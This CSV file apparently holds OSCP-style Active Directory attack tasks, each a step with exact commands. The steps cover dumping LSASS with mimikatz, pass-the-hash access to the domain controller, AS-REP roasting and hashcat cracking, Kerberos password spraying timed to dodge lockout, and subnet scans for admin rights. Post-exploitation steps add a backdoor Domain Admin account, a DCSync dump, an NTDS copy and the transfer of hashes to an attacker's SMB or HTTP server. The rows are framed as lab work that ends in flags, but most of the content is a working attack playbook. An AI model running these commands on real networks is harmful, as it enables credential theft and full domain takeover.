"id","name","objective","description","expected_output","notes"
"dump-lsass-credentials","Dump LSASS Credentials with Mimikatz","Extract all cached credentials from LSASS memory including service sessions","Use mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory, then parse output to identify Domain Admin service sessions.

Command Execution:
1. Run: .\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > output.txt
2. Wait 5-10 seconds (LSASS dump takes time on busy systems)
3. Download results: download output.txt (Evil-WinRM) OR copy to share
4. Parse output locally for analysis

Expected Output Structure:
Authentication Id : 0 ; 12345678
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
NTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
SHA1              : ...

KEY INDICATORS FOR SERVICE SESSIONS:
- 'Session: Service from 0' (NOT 'Interactive from 2' or 'RemoteInteractive from 10')
- These sessions persist until reboot (hours/days/weeks)
- Cached when service starts, credentials remain in memory until service stops

Parsing Strategy:
1. Search for 'Service from 0' sessions first (highest priority)
2. Extract NTLM hashes for those sessions
3. Map usernames to Domain Admin group (check with 'net group ""Domain Admins"" /domain')
4. Ignore interactive sessions (less reliable, log out quickly)

Common Output Patterns:
- Multiple entries for same user (different logon sessions)
- Service sessions have Logon Server = DC (Domain Controller)
- Standard users also appear (filter for admin accounts)

Troubleshooting:
- ERROR 0x00000005: Forgot privilege::debug (run step 5 again)
- No output: LSASS protected (credential guard enabled), use alternative
- Only computer accounts: No user sessions cached, try different system
- Empty NTLM fields: WDigest disabled (Windows 8.1+), use Kerberos tickets instead","",""
"extract-service-session-creds","Extract and Validate Service Session Credentials","Parse mimikatz output to extract Domain Admin credentials and validate they work","Parse mimikatz output to extract NTLM hashes from service sessions, map to Domain Admin accounts, and validate credentials.

Parsing Steps:
1. Open output.txt from step 6
2. Search for 'Session           : Service from 0'
3. Extract User Name, Domain, NTLM hash from that section
4. Repeat for all service sessions in output
5. Build credential list: DOMAIN\username:NTLMhash

Mapping to Domain Admins:
1. Check group membership: net group ""Domain Admins"" /domain
2. Cross-reference extracted usernames with Domain Admins list
3. Prioritize: Domain Admins > Enterprise Admins > Local Admins with domain access

Validation with Crackmapexec:
1. Test each extracted hash: crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>
2. Look for 'Pwn3d!' indicator (confirms Domain Admin)
3. If fails: Credential may be stale, service account may be disabled, wrong domain

Example Extraction:
Input (mimikatz):
```
Authentication Id : 0 ; 123456
Session           : Service from 0
User Name         : svc_backup
Domain            : CORP
NTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Output (credential):
CORP\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Validation:
crackmapexec smb 10.10.10.10 -u svc_backup -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP
Expected: '[+] CORP\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)'

Troubleshooting:
- Validation fails but hash correct: Account may require interactive logon, try different DC
- Multiple service sessions found: Test ALL of them (some may be disabled accounts)
- Hash format wrong: Ensure 32 characters (NTLM), not 40 (SHA1) or 64 (SHA256)
- Pwn3d not showing: May still be valid user, just not Domain Admin (check group membership)","",""
"escalate-to-domain-admin","Escalate to Domain Admin Access","Use harvested credentials to access Domain Controller and retrieve flags","Use extracted Domain Admin credentials to access Domain Controller via Pass-the-Hash and retrieve proof of compromise.

Access Methods:
1. Evil-WinRM PTH: evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
2. PSExec PTH: impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
3. WMI PTH: impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
4. RDP (if enabled): xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:<DC_IP>

Verification Steps:
1. Connect to DC with harvested credentials
2. Verify access: whoami (should be DOMAIN\Administrator or service account)
3. Confirm domain rights: net group ""Domain Admins"" /domain (verify membership)
4. Check DC hostname: hostname (confirm you're on Domain Controller)

Flag Retrieval:
1. Navigate to C:\Users\Administrator\Desktop
2. Read flag: type proof.txt OR type flag.txt
3. Document access: whoami /all > proof_of_access.txt
4. Download proof: download proof_of_access.txt (for writeup evidence)

Additional Actions (Post-Exploitation):
1. DCSync full domain: impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>
2. Golden Ticket creation: Extract krbtgt hash for persistence
3. Create additional Domain Admin: net user backdoor Password123! /add /domain && net group ""Domain Admins"" backdoor /add /domain
4. Exfiltrate AD database: ntdsutil ""ac i ntds"" ""i f m"" ""cr fu C:\temp"" q q

CRITICAL: Document EVERYTHING for writeup:
- Exact command used for access
- Proof of Domain Admin (whoami /all output)
- Flag contents
- Timeline (time from initial access to DA compromise)

SUCCESS: You've escalated from local admin on workstation to Domain Admin by exploiting cached service session. Total time: ~15 minutes.","",""
"verify-domain-access","Verify Domain Access and Time Synchronization","Confirm network connectivity to domain controller and synchronize system time to avoid Kerberos errors","REQUIREMENTS: Network access to DC (Kerberos port 88 for Linux OR RDP/WinRM for Windows).

LINUX TIME SYNC: Kerberos requires <5 minute clock difference.
Use ntpdate or rdate to sync with DC: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>.
Verification: date (shows system time).
Compare with DC time.

WINDOWS: Time sync handled automatically on domain-joined systems (no action needed).

CONNECTIVITY TEST: Linux → sudo nmap -p 88 -Pn -sU -v <DC_IP> (verify UDP 88 open/filtered).
Windows → test-netconnection <DC_IP> -port 88 (verify connectivity).

CRITICAL: If time sync fails, Kerberos will return KRB_AP_ERR_SKEW error and attack cannot proceed.","",""
"identify-vulnerable-users","Enumerate Users with Preauthentication Disabled","Identify all users with DONT_REQ_PREAUTH flag (vulnerable to AS-REP roasting)","LINUX AUTHENTICATED: impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).
Requires valid domain credentials.

LINUX UNAUTHENTICATED: impacket-GetNPUsers -usersfile <USERLIST> -dc-ip <DC_IP> <DOMAIN>/ -no-pass (requires username wordlist, rare to succeed).

WINDOWS: Rubeus.exe asreproast /nowrap (uses current user context, no credentials needed) OR PowerView Get-DomainUser -PreauthNotRequired.

OUTPUT ANALYSIS: Name (username), MemberOf (group membership - prioritize admin groups), PasswordLastSet (old dates = weak passwords), UAC (0x410200 = preauthentication disabled).

EXPECTED RESULTS: 0-5 vulnerable users typical.
0 users = NORMAL (preauthentication enabled by default).
>5 users = misconfigured environment or many legacy accounts.

TIME ESTIMATE: <5 seconds for enumeration.","",""
"extract-asrep-hashes","Request and Extract AS-REP Hashes","Request AS-REP responses and extract encrypted hashes for offline cracking","LINUX: impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>.
The -request flag triggers TGT requests for all vulnerable users.
-outputfile saves hashes in Hashcat mode 18200 format.

WINDOWS: Rubeus.exe asreproast /nowrap /outfile:C:\hashes.asreproast.
The /nowrap flag prevents line breaks in hash (Hashcat requires single-line format).
/outfile saves hashes to file.

HASH FORMAT: $krb5asrep$23$user@DOMAIN.COM:hash_data.
The '23' indicates etype 23 (RC4-HMAC).

CRITICAL: If step 2 found 0 vulnerable users, this step will return 'No entries' - this is EXPECTED and NOT a failure.
Document result and proceed to alternative credential access methods.

TIME ESTIMATE: <10 seconds for hash extraction.","",""
"transfer-hashes","Transfer Hashes to Cracking System (If Needed)","Move hash files from Windows to Linux Kali system for Hashcat cracking","SKIP IF: Hashes extracted on Kali Linux directly (impacket-GetNPUsers).
Proceed directly to step 5 (crack-asrep-hashes).

REQUIRED IF: Hashes extracted on Windows with Rubeus.
Must transfer to Kali for Hashcat cracking (Kali has better wordlists, GPU support).

TRANSFER METHODS:
(1) SMB share: Kali → sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.
Windows → copy C:\hashes.asreproast \\KALI_IP\share\hashes.asreproast.

(2) RDP disk sharing: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, then copy C:\hashes.asreproast to \\tsclient\share.

(3) Base64 encode: Windows → certutil -encode C:\hashes.asreproast C:\hashes.b64, paste to Kali, base64 -d > hashes.asreproast.

(4) HTTP server: Kali → python3 -m http.server 8000 (POST endpoint), Windows → curl or PowerShell Invoke-WebRequest.

TIME ESTIMATE: 30-60 seconds.","",""
"crack-asrep-hashes","Crack AS-REP Hashes with Hashcat Mode 18200","Recover plaintext passwords from AS-REP hashes using offline dictionary and rule-based attacks","HASHCAT MODE: 18200 (Kerberos 5, etype 23, AS-REP).
VERIFY: hashcat --help | grep -i 'Kerberos' shows mode 18200.

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force (try first - fast, 14M passwords in <1 sec on GPU, ~30 sec on CPU).

(2) RULE-BASED: hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds common mutations - Password → Password1!, Password123, etc.).

(3) TARGETED: Create custom wordlist from username, org name, common patterns.
Example: echo -e 'dave\nDave\nDAVE\ndave123\nDave2023!' > custom.txt; hashcat -m 18200 hashes.asreproast custom.txt.

--force FLAG: Required in Kali VM without GPU (suppresses OpenCL warnings).

MONITORING: Press 's' key for status, --status --status-timer=30 for automatic updates.

TIME ESTIMATE: Weak password (dictionary + number) = 1-10 minutes.
Strong password (random 12+ chars) = infeasible.","",""
"validate-credentials","Validate Cracked Credentials","Confirm cracked passwords are valid and accounts are active","QUICK VALIDATION: Use kerbrute passwordspray with single-user file.
Create file: echo 'dave' > single_user.txt.
Test: kerbrute passwordspray -d corp.com --dc <DC_IP> single_user.txt 'Flowers1'.
Output: [+] VALID LOGIN: dave@corp.com:Flowers1 confirms credentials work.

ALTERNATIVE: CrackMapExec SMB authentication (also checks admin rights in one command - see next step).
SMB: crackmapexec smb <DC_IP> -u dave -p 'Flowers1' -d corp.com.
Output: [+] corp.com\dave:Flowers1 confirms valid.

TIME ESTIMATE: 5-10 seconds.

FAILURE SCENARIOS: STATUS_LOGON_FAILURE (password incorrect - Hashcat cracked wrong password or account changed), STATUS_ACCOUNT_LOCKED_OUT (account locked since hash extraction), STATUS_ACCOUNT_DISABLED (account disabled by admin).

If validation fails, try other cracked hashes or proceed to alternative attacks.","",""
"check-admin-rights","Check for Local Administrator Rights","Identify systems where compromised user has local administrator privileges for lateral movement","CRACKMAPEXEC SUBNET SCAN: Test credentials against entire subnet to find local admin access.

COMMAND: crackmapexec smb 192.168.50.0/24 -u dave -p 'Flowers1' -d corp.com.
Scans all 254 IPs in /24 subnet.

OUTPUT: [+] 192.168.50.75 corp.com\dave:Flowers1 (Pwn3d!) = LOCAL ADMIN rights on 192.168.50.75.
[+] 192.168.50.80 corp.com\dave:Flowers1 = valid credentials but NOT admin.

PWND INDICATOR: Shown when user can access ADMIN$ share (local admin rights).

LOCAL ADMIN = FULL SYSTEM COMPROMISE: Can execute code as SYSTEM, dump SAM/LSA secrets, extract cached credentials, dump LSASS memory for plaintext passwords and Kerberos tickets.

LATERAL MOVEMENT: Use evil-winrm, psexec, wmiexec to access (Pwn3d!) systems.

STANDARD USER (no Pwn3d!): Still valuable - can enumerate AD, access file shares, attempt local privilege escalation, Kerberoast, AS-REP roast other users.

TIME ESTIMATE: 2-4 minutes for /24 subnet scan.","",""
"verify-kerberos-access","Verify Kerberos Port Access","Confirm UDP port 88 is accessible on domain controller for Kerberos authentication","Use nmap to verify Kerberos port 88/UDP is reachable.
This is REQUIRED for Kerbrute to function.

If port 88 is blocked, this attack chain cannot proceed (fall back to internal spray methods).","",""
"enumerate-valid-users","Enumerate Valid Domain Usernames","Validate usernames against domain using Kerberos AS-REQ to build target list for spraying","Use kerbrute userenum with username wordlist.
Kerbrute sends AS-REQ (TGT request) for each username.
Domain controller responds differently for valid users (PREAUTH_REQUIRED) vs invalid users (PRINCIPAL_UNKNOWN).
This identifies valid usernames without authentication.

Recommended wordlist: /usr/share/seclists/Usernames/Names/names.txt (common first names) or /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (comprehensive).

Save valid usernames to file with -o flag for next step.","",""
"spray-common-password","Spray Common Password Against Valid Users","Test single common password against all valid usernames to find working credentials","Use kerbrute passwordspray with valid username list from previous step.
Test ONE common password (e.g., Nexus123!, Welcome2023!, Password123!, CompanyName2023!).
Kerbrute attempts Kerberos authentication for each user.
Success = TGT issued (valid credentials).
Failure = PREAUTH_FAILED (wrong password).

ONLY 2 UDP packets per attempt = extremely fast.

CRITICAL: Only spray 3-4 passwords total to avoid lockout risk (most domains have 5 attempt threshold).
Example: spray 'Password123!', wait 30min, spray 'Welcome2023!', wait 30min, spray 'Summer2023!'.

Save results with -o flag.","",""
"spray-additional-password","Spray Additional Password (Optional)","Test second/third common password if first spray found zero credentials","If first password spray was unsuccessful, wait 30+ minutes for observation window to reset, then spray a different common password.
Limit to 3-4 total passwords to stay under typical lockout threshold of 5 attempts.

Common OSCP-relevant passwords: Password123!, Welcome2023!, CompanyName2023!, Summer2023!, Winter2023!, Spring2023!, Autumn2023!, Admin123!, Password1, Passw0rd!.

TIMING: Wait at least 30 minutes between spray attempts (common observation window duration).
Use timer to track when safe to spray again.","",""
"validate-credentials","Quick-Validate Found Credentials","Confirm credentials are valid and still active using fast Kerberos validation","Use kerbrute passwordspray with single-user file containing found username to re-validate credentials.
This ensures credentials weren't disabled since discovery and confirms password is correct.
Takes <5 seconds.

Creates file with found username (echo 'username' > single_user.txt) then runs kerbrute passwordspray to confirm.

Alternative: skip to next step (admin validation) which also confirms credentials work.","",""
"check-admin-rights","Check for Local Admin Rights on Network Systems","Identify which systems the compromised user has local administrator privileges on","Use CrackMapExec to scan target subnet (or specific IPs) with found credentials.
CME tests SMB authentication and checks if user can access ADMIN$ share (indicates local admin).
Pwn3d! indicator = local admin rights = can execute code as SYSTEM.

Scan single IP first to verify credentials work with SMB, then scan subnet /24 to find all systems where user is admin.
Example: crackmapexec smb 192.168.50.0/24 -u username -p password -d domain.com.
Look for (Pwn3d!) in output.

If user is admin on workstations, pivot there to dump credentials (SAM, LSA, LSASS) for lateral movement.","",""
"lateral-movement-prep","Prepare for Lateral Movement and Privilege Escalation","Plan next attack phase based on admin rights discovery results","DECISION TREE based on previous step results:

(1) If user has Pwn3d! on any systems → proceed to dump-credentials-via-smb step to extract SAM/LSA/LSASS credentials.

(2) If user has NO admin rights → attempt evil-winrm or RDP login as standard user, then perform local privilege escalation (check for vulnerable services, unquoted service paths, AlwaysInstallElevated, etc.).

(3) If SMB access denied (external position) → use credentials for other services: WinRM (evil-winrm), RDP, VPN access, web application authentication, or pivot through VPN/Citrix to internal network then retry SMB.

OSCP STRATEGY: Even standard domain user credentials are valuable - can enumerate AD, access file shares, pivot to other services.
Don't stop if no local admin found.","",""
